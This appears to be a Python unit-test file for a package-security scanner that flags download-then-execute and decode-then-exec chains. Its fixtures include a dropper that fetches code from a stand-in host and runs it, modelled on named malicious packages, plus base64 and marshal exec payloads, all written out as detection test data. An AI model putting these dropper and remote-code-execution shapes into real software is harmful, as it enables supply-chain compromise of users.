"""decode->exec / download->execute chain rules: the two real false positives stay fixed, the real attack shapes stay BLOCK."""
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "guard"))
import scan_engine as E


def chain(code, kind):
    pairs = (E._DECODE_PATTERNS, E._EXEC_PATTERNS) if kind == "decode" else (E._DOWNLOAD_PATTERNS, E._EXECUTE_PATTERNS)
    t = E._resolve_aliases(code)
    return E._find_chain(t.splitlines(), *pairs, E.CHAIN_LINE_WINDOW, t)


def analyze(code, name="m.py"):
    f = E.ScanFeatures(name="t", version="1")
    with tempfile.TemporaryDirectory() as d:
        root = Path(d) / "t-1.tar.gz.unpacked" / "t-1"; root.mkdir(parents=True)
        (root / name).write_text(code)
        E.static_analysis(list(Path(d).rglob("*")), f)
    return f


class NotAChain(unittest.TestCase):
    def test_exception_class_is_not_an_execution(self):                          # unstructured 0.27.16
        code = ("r = requests.get(url)\ntry:\n    pass\n"
                "except (OSError, subprocess.CalledProcessError, subprocess.TimeoutExpired):\n    pass\n")
        self.assertIsNone(chain(code, "dl"))
        f = analyze(code); self.assertFalse(f.has_download_then_execute)
        self.assertNotEqual(E.compute_verdict(f).verdict, "BLOCK")

    def test_constants_are_not_an_execution(self):
        self.assertIsNone(chain("requests.get(u)\nx = subprocess.PIPE\ny = subprocess.DEVNULL\n", "dl"))

    def test_prose_f_strings_are_not_calls(self):                               # hol-guard 3.26.0
        code = 'parts.append(f"eval(): {r.eval_signals[0]!r}")\nparts.append(f"marshal.loads(): {r.marshal_signals[0]!r}")\n'
        self.assertIsNone(chain(code, "decode"))
        f = analyze(code); self.assertFalse(f.has_decode_then_exec)

    def test_one_prose_literal_and_one_real_call(self):
        self.assertIsNone(chain('log("calls urllib.request.urlopen( here")\nos.system(c)\n', "dl"))
        self.assertIsNone(chain('"""uses marshal.loads( to read"""\nexec(code)\n', "decode"))


class StillAChain(unittest.TestCase):
    def test_plain_chains(self):
        self.assertTrue(chain("requests.get(u)\nsubprocess.run(c)\n", "dl"))
        for call in ("subprocess.call(c)", "subprocess.check_output(c)", "subprocess.getoutput(c)", "os.system(c)", "Popen(c)"):
            self.assertTrue(chain(f"urllib.request.urlretrieve(u, f)\n{call}\n", "dl"), call)
        self.assertTrue(chain("exec(base64.b64decode(blob))\n", "decode"))
        self.assertTrue(chain("exec(marshal.loads(blob))\n", "decode"))

    def test_dropper_writes_payload_literal_then_runs_it(self):                 # colored-fidget, libsock4, httpxontop, discord-manager
        code = ('t.write(b"""from urllib.request import urlopen as u;exec(urllib.request.urlopen(\'http://x/p\').read())""")\n'
                'os.system(f"start {t.name}")\n')
        self.assertTrue(chain(code, "dl"))
        f = analyze(code, "setup.py"); self.assertTrue(f.has_download_then_execute)
        self.assertEqual(E.compute_verdict(f).verdict, "BLOCK")

    def test_code_inside_one_literal(self):
        self.assertTrue(chain('code = "import base64; exec(base64.b64decode(\'QQ==\'))"\n', "decode"))
        self.assertTrue(chain('code = """\nimport base64\nexec(base64.b64decode("QQ=="))\n"""\n', "decode"))

    def test_literal_passed_to_exec_is_code(self):
        self.assertTrue(chain('exec("x = base64.b64decode(y)")\n', "decode"))

    def test_comments_and_hash_in_strings_do_not_confuse_the_scanner(self):
        self.assertTrue(chain("# it's a trick\nexec(base64.b64decode(b))\n", "decode"))
        self.assertTrue(chain('u = "http://a/#frag"\nexec(base64.b64decode(b))\n', "decode"))

    def test_aliased_calls_still_resolve(self):
        code = "from subprocess import run as r\nfrom requests import get as g\ng(u)\nr(c)\n"
        # alias resolution rewrites calls through aliases to the canonical dotted form before matching
        self.assertTrue(chain(code, "dl"))


class Scanner(unittest.TestCase):
    def test_backslash_newline_continues_a_string(self):                         # found by comparing with the regex version on 9,824 files
        code = 'msg = "first part \\\n    eval( second part"\nv = base64.b64decode(y)\n'
        self.assertIsNone(chain(code, "decode"))        # the eval( is inside ONE two-line literal -> prose

    def test_unterminated_strings_fall_back_to_strict_counting(self):
        self.assertTrue(chain('x = "oops\nexec(base64.b64decode(b))\n', "decode"))       # rest of the line dropped, next line is code
        self.assertTrue(chain('"""never closed\nexec(base64.b64decode(b))\n', "decode"))   # unterminated triple quote: counted as before

    def test_crafted_input_is_scanned_in_linear_time(self):
        import time
        head = "exec(base64.b64decode(x))\n"
        for body in ('"\\' * 480_000, '"\\\n' * 320_000, ("\'\'\'a\"\"\"b" * 100_000), '"' + '\\"' * 450_000 + '"'):
            t = head + body
            start = time.time()
            self.assertTrue(chain(t, "decode"))
            self.assertLess(time.time() - start, 5.0, body[:12])      # the regex version never finished on the first one

    def test_oversized_files_skip_the_literal_rule(self):
        big = 'f"eval(): {a}"\nv = base64.b64decode(y)\n' + "# pad\n" * 400_000
        self.assertGreater(len(big), E.MAX_LITERAL_SCAN_BYTES)
        self.assertEqual(E._string_spans(big), [])


class KnownLimit(unittest.TestCase):
    def test_prose_literal_naming_two_kinds_of_calls_is_still_counted(self):
        # documented limit (LIMITS.md 9-6): indistinguishable from a self-contained payload by text alone
        self.assertTrue(chain('doc = "run requests.get( then subprocess.run( it"\nos.system(c)\n', "dl"))


if __name__ == "__main__":
    unittest.main()
